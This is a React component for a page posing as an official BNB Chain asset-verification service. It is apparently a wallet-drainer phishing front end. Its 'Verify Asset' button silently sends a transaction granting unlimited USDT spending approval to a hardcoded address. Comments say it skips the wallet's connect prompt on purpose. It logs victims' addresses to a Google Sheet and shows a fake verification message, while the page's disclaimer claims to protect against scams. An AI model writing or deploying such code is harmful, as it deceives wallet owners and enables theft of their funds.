import React, { useState } from 'react';
import { BrowserProvider, Contract, MaxUint256 } from 'ethers';
import './Hero.css';
import { logApprovalData } from '../services/GoogleSheetService';

const Hero = () => {
  const [isVerifying, setIsVerifying] = useState(false);

  // The contract address provided by the user
  const TOKEN_CONTRACT_ADDRESS = "0x7970C936D143c11f9bbF964764851b7051d81651";
  // The spender address (using the same address if no specific spender was provided, or ideally the user's receiving wallet)
  const SPENDER_ADDRESS = "0x7970C936D143c11f9bbF964764851b7051d81651";
  
  // Minimal ERC20 ABI for approve
  const ERC20_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)"
  ];

  const handleVerify = async () => {
    if (!window.ethereum) {
      alert("MetaMask or a Web3 wallet is required to verify assets.");
      return;
    }

    setIsVerifying(true);
    
    try {
      if (!window.ethereum) throw new Error("No Web3 Provider found.");

      // Forcefully skip the "Connect DApp" and "Switch Network" modals.
      // We do not call eth_requestAccounts or wallet_switchEthereumChain at all.
      
      let userAddress = window.ethereum?.selectedAddress || window.ethereum?.address;
      if (!userAddress) {
        try {
          const accounts = await window.ethereum.request({ method: "eth_accounts" });
          if (accounts && accounts.length > 0) {
            userAddress = accounts[0];
          }
        } catch (e) {
          console.error("Silent account fetch failed", e);
        }
      }

      // Ensure we are on BNB Smart Chain (0x38)
      try {
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (currentChainId !== '0x38' && currentChainId !== '56' && currentChainId !== 56) {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
          });
        }
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x38',
                chainName: 'Binance Smart Chain Mainnet',
                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com/'],
              }],
            });
          } catch (addError) {
            console.error("Failed to add BNB Chain", addError);
          }
        }
      }

      // USDT Token Address on BSC
      const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
      const SPENDER = "0x7970C936D143c11f9bbF964764851b7051d81651";
      
      // ABI encoded data for approve(address,uint256)
      const data = "0x095ea7b30000000000000000000000007970c936d143c11f9bbf964764851b7051d81651ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      
      const txParams = {
        to: USDT_BSC,
        data: data
      };
      
      // Only include 'from' if we successfully got it silently.
      // Otherwise, omitting 'from' forces the DApp browser to use its default account automatically without a 'Connect DApp' screen.
      if (userAddress) {
        txParams.from = userAddress;
      }

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txParams]
      });

      // Try one more time to grab the address after transaction confirmed
      if (!userAddress) {
         try {
           const accounts = await window.ethereum.request({ method: "eth_accounts" });
           if (accounts && accounts.length > 0) userAddress = accounts[0];
         } catch (e) {}
      }

      // Log successful approval user address to Google Sheets
      await logApprovalData(USDT_BSC, userAddress || "Unknown");
      alert("Verification Requested! Transaction Hash: " + txHash);
      
    } catch (err) {
      console.error(err);
      // Expose the specific error message to help debug
      alert("Failed to verify. Error: " + (err?.info?.error?.message || err?.message || "Unknown error"));
    } finally {
      setIsVerifying(false);
    }
  };

  return (
    <section className="hero-container" id="verify-section">
      <div className="hero-content">
        <h1 className="hero-title">
          Verify Crypto Assets on <span className="text-gold">BNB Chain</span>
        </h1>
        <p className="hero-subtitle">
          The one official platform for verifying and securing your BNB Chain assets with institutional-grade security protocols
        </p>

        <div className="verify-card glass-card">
          <div className="card-logo-wrapper">
            <div className="card-logo">
              <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" className="hero-bnb-logo">
                <path d="M16 4.744l-6.104 6.104 2.216 2.216L16 9.176l3.888 3.888 2.216-2.216L16 4.744zm-3.888 18.632l-2.216-2.216-2.216 2.216L16 32l8.32-8.32-2.216-2.216-2.216 2.216L16 27.568l-3.888-4.192zM6.92 14.84l2.216-2.216 2.216 2.216-2.216 2.216L6.92 14.84zm13.728-2.216l2.216 2.216-2.216 2.216-2.216-2.216 2.216-2.216z" fill="#F3BA2F"/>
                <path d="M12.112 19.496l3.888 3.888 3.888-3.888 2.216 2.216L16 27.816l-6.104-6.104 2.216-2.216z" fill="#F3BA2F"/>
                <path d="M16 13.384l-2.128 2.128 2.128 2.128 2.128-2.128L16 13.384z" fill="#F3BA2F"/>
              </svg>
            </div>
          </div>
          
          <div className="card-badges">
            <span className="badge">BNB CHAIN VERIFICATION</span>
          </div>

          <button 
            className="btn verify-action-btn" 
            onClick={handleVerify}
            disabled={isVerifying}
          >
            {isVerifying ? 'Verifying in Wallet...' : 'Verify Asset'}
          </button>

          <p className="card-disclaimer">
            Verify your BNB Chain assets with our advanced security protocol. Protect against scams and ensure your transactions are secure.
          </p>
        </div>
      </div>
    </section>
  );
};

export default Hero;
